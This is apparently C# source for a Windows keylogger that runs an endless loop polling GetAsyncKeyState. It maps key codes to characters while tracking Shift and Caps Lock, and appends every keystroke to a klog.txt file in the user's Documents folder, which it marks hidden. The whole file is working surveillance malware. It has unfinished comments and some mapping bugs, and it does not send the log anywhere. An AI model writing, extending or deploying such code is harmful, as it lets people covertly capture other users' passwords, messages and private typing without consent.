using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;

namespace Keylogger_1
{
    class Program
    {
        public static int VK_SHIFT = 0x10;

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 x);
        static void Main(string[] args)
        {
            String fpath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String path = (fpath + "\\klog.txt");
            if (File.Exists(path)) File.SetAttributes(path,FileAttributes.Hidden);
            int cap_flag = 0;
            int shift = 0;
            string[] spec_chars = { ")","!", "@", "#", "$", "%", "^", "&", "*", "(", ")" };
            while (true) {
                Thread.Sleep(10);
                //int cap_flag_ctr = 0;
                for (int i = 0; i < 300; i++)
                {
                    int pressed = GetAsyncKeyState(i);
                    if (pressed == 32769) 
                    {
                        Console.Write( i + " " );
                        char key = (char)i;

                        if (GetAsyncKeyState(VK_SHIFT) > 0 && shift == 0)
                        {
                            shift = 1;
                            //Console.Write("shift triggered");
                        }
                        if (GetAsyncKeyState(VK_SHIFT) == 0 && shift == 1)
                        {
                            shift = 0;
                            //Console.Write("shift triggered");
                        }

                        //changes to be made - add shift function, read mouse buttons separately
                        StreamWriter sw = new StreamWriter(path, true);

                        if (i == 20)
                        {
                            cap_flag = (cap_flag + 1) % 2;
                            //Console.Write(cap_flag);
                        }
                        int caps_or_not = cap_flag ^ shift;
                        if (Char.IsDigit(key))
                        {
                            if (shift == 1) 
                            {
                                sw.Write(spec_chars[Int16.Parse(Char.ToString(key))]);
                            }
                            else 
                            {
                                sw.Write(key);
                            }
                        }
                        else
                        {
                            if (Char.IsLetter(key))
                            {
                                //int caps_or_not = cap_flag ^ shift;
                                if (caps_or_not == 1)
                                {
                                    sw.Write(key);
                                }
                                else
                                {
                                    key = (char)(i + 32);
                                    //Console.Write(key);
                                    sw.Write(key);
                                }
                                //sw.Write(key);
                            }
                            //sw.Write(key);
                            else
                            {
                                if (i == 32)
                                {
                                    sw.Write(key);
                                }
                                if (i == 13)
                                {
                                    sw.Write("\n [ENTER] \n");
                                }
                                if (i == 8)
                                {
                                    sw.Write(" [backspace] ");
                                }
                                if (i == 9)
                                {
                                    sw.Write(" [tab] ");
                                }
                                //special characters
                                else
                                {
                                    switch (i)
                                    {
                                        case 189:
                                            string[] x1 = { "-", "_" };
                                            sw.Write(x1[shift]);
                                            break;
                                        case 187:
                                            string[] x2 = { "=", "+" };
                                            sw.Write(x2[shift]);
                                            break;
                                        case 219:
                                            string[] x3 = { "[", "{" };
                                            sw.Write(x3[shift]);
                                            break;
                                        case 221:
                                            string[] x4 = { "]", "}" };
                                            sw.Write(x4[shift]);
                                            break;
                                        case 220:
                                            string[] x5 = { "\\", "|" };
                                            sw.Write(x5[shift]);
                                            break;
                                        case 186:
                                            string[] x6 = { ";", ":" };
                                            sw.Write(x6[shift]);
                                            break;
                                        case 222:
                                            string[] x7 = { "\'", "\"" };
                                            sw.Write(x7[shift]);
                                            break;
                                        case 188:
                                            string[] x8 = { ",", "" };
                                            sw.Write(x8[shift]);
                                            break;
                                        case 190:
                                            string[] x9 = { ".", ">" };
                                            sw.Write(x9[shift]);
                                            break;
                                        case 191:
                                            string[] x10 = { "/", "?" };
                                            sw.Write(x10[shift]);
                                            break;
                                        case 192:
                                            string[] x11 = { "`", "~" };
                                            sw.Write(x11[shift]);
                                            break;
                                    }
                                }

                            }
                        }
                        //file io
                        //sw.Write(key);
                        sw.Close();
                    }
                }
            }
        }
    }
}
